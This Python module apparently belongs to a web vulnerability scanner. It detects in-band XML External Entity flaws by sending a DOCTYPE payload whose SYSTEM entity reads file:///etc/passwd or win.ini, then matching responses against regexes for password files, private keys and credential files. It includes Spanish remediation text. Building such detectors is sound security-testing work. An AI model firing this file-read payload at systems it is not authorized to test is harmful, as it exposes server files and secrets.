"""In-band XML External Entity — local file disclosure. CWE-611, OWASP A05:2021 (WSTG-INPV-07).

The OAST rule (``xxe-oob``) catches *blind* XXE by making the parser fetch a collaborator URL. This
detector catches the **in-band** case the collaborator can't: a parser that resolves an external
``SYSTEM`` entity and reflects its content, so the file we asked for comes straight back in the response.

It targets only requests that already speak XML — an ``application/xml`` content type, or a body value
that is itself an XML document — so it never sprays XML at JSON/form endpoints. Zero false positives: a
hit is reported only when the response carries a **known sensitive-file signature** (``/etc/passwd``, a
private key, Windows ``win.ini``, a credentials file) — a normal echo of our XML never matches one — and
it must reproduce.
"""

from __future__ import annotations

import re
from urllib.parse import urlsplit

import httpx

from dastcore.core.http_client import BudgetExceededError, HttpClient, OutOfScopeError
from dastcore.core.models import Evidence, Finding, HttpRequest, HttpResponse, InjectionPoint
from dastcore.engine.injection_points import extract_injection_points
from dastcore.engine.rule_engine import build_mutated_request

_MAX_POINTS = 24

# The files we try to read out-of-the-parser via an external SYSTEM entity. Unix first, then Windows.
_XXE_TARGETS = ("file:///etc/passwd", "file:///c:/windows/win.ini", "file:///c:/Windows/win.ini")


def _payload(target: str) -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE dcroot [<!ENTITY dcxxe SYSTEM "{target}">]>'
        "<dcroot>&dcxxe;</dcroot>"
    )


# Signatures of a genuinely sensitive file — the same bar the LFI prover uses, so a normal reflected
# document is never presented as an exfiltrated file. (pattern, human label.)
_FILE_SIGNATURES: list[tuple[str, str]] = [
    (r"root:.*:0:0:", "/etc/passwd (cuentas del sistema Unix)"),
    (r"-----BEGIN [A-Z ]*PRIVATE KEY-----", "una clave privada"),
    (r"\[(fonts|extensions|mci extensions)\]|for 16-bit app support", "Windows win.ini"),
    (r"(?im)^\s*(DB_PASSWORD|SECRET[_A-Z]*|API[_-]?KEY|PASSWORD|TOKEN)\s*[=:]", "un fichero con credenciales"),
]


def _looks_like_xml(value: object) -> bool:
    return isinstance(value, str) and value.lstrip()[:1] == "<"


def _is_xml_endpoint(request: HttpRequest) -> bool:
    ctype = (request.headers or {}).get("Content-Type") or (request.headers or {}).get("content-type") or ""
    return "xml" in ctype.lower()


def _match_signature(text: str) -> tuple[str, str] | None:
    for pattern, label in _FILE_SIGNATURES:
        m = re.search(pattern, text)
        if m:
            snippet = text[max(0, m.start() - 8) : m.start() + 160]
            return label, " ".join(snippet.split())[:200]
    return None


def _finding(point: InjectionPoint, request: HttpRequest, response: HttpResponse, label: str, snippet: str) -> Finding:
    path = urlsplit(request.url).path or "/"
    where = f"{point.location}:{point.name}"
    return Finding(
        id=f"xxe-inband:{request.method}:{path}:{where}",
        rule_id="xxe-inband",
        name="XML External Entity (in-band, lectura de fichero)",
        severity="high",
        cwe="CWE-611",
        owasp="A05:2021",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        family="xxe",
        injection_point=point,
        evidence=[
            Evidence(
                type="response_match",
                data=(
                    f"una entidad externa SYSTEM ({where}) hizo que el parser leyera {label} y lo "
                    f"devolviera en la respuesta: «{snippet}» — XXE in-band (lectura de ficheros del servidor)"
                )[:200],
                confidence="high",
            )
        ],
        request=request,
        response=response,
        remediation=(
            "Desactiva el procesamiento de DTD y de entidades externas en el parser XML "
            "(FEATURE_SECURE_PROCESSING / disallow-doctype-decl; desactiva entidades generales y de parámetro). "
            "Prefiere un parser que rechace documentos con DOCTYPE."
        ),
    )


async def _probe(client: HttpClient, sender, point: InjectionPoint) -> Finding | None:
    """Send each file-target payload via ``sender`` (xml -> HttpResponse|None); confirm reproducible."""
    for target in _XXE_TARGETS:
        resp = await sender(_payload(target))
        if resp is None:
            continue
        hit = _match_signature(resp.text)
        if not hit:
            continue
        confirm = await sender(_payload(target))
        if confirm is not None and _match_signature(confirm.text):
            label, snippet = hit
            return _finding(point, point.request_template, resp, label, snippet)
    return None


async def _send_raw_xml(client: HttpClient, request: HttpRequest, xml: str) -> HttpResponse | None:
    """POST the raw XML document as the request body (Content-Type: application/xml), session-aware."""
    headers = {k: v for k, v in (request.headers or {}).items() if k.lower() != "content-type"}
    headers["Content-Type"] = "application/xml"
    method = request.method if request.method in ("POST", "PUT", "PATCH") else "POST"
    try:
        return await client.request(method, request.url, headers=headers, content=xml)
    except (OutOfScopeError, BudgetExceededError, httpx.HTTPError):
        return None


async def _send_value(client: HttpClient, point: InjectionPoint, xml: str) -> HttpResponse | None:
    """Inject the XML document as the value of a body/JSON point (endpoints that parse a param as XML)."""
    req = build_mutated_request(point, xml)
    try:
        return await client.request(
            req.method, req.url, params=req.params or None, headers=req.headers or None,
            cookies=req.cookies or None, data=req.data, json=req.json_body,
        )
    except (OutOfScopeError, BudgetExceededError, httpx.HTTPError):
        return None


async def run_xxe_inband_checks(client: HttpClient, requests: list[HttpRequest]) -> list[Finding]:
    """Send external-entity file-read payloads to XML-speaking requests and report reflected file content."""
    findings: list[Finding] = []
    seen: set[str] = set()
    probed = 0
    for request in requests:
        path = urlsplit(request.url).path or "/"

        # 1) Endpoint declares XML: replace the whole body with the XXE document (raw send).
        if _is_xml_endpoint(request):
            key = f"body:{request.method}:{path}"
            if key not in seen:
                seen.add(key)
                probed += 1
                point = InjectionPoint(location="body", name="xml-document", base_value="", request_template=request)
                found = await _probe(client, lambda xml, r=request: _send_raw_xml(client, r, xml), point)
                if found is not None:
                    findings.append(found)

        # 2) A body/JSON value that is itself an XML document: inject the XXE document as that value.
        for point in extract_injection_points(request, include_headers=False):
            if point.location not in ("body", "json") or not _looks_like_xml(point.base_value):
                continue
            key = f"{path}:{point.location}:{point.name}"
            if key in seen:
                continue
            seen.add(key)
            probed += 1
            if probed > _MAX_POINTS:
                return findings
            found = await _probe(client, lambda xml, p=point: _send_value(client, p, xml), point)
            if found is not None:
                findings.append(found)
        if probed > _MAX_POINTS:
            break
    return findings
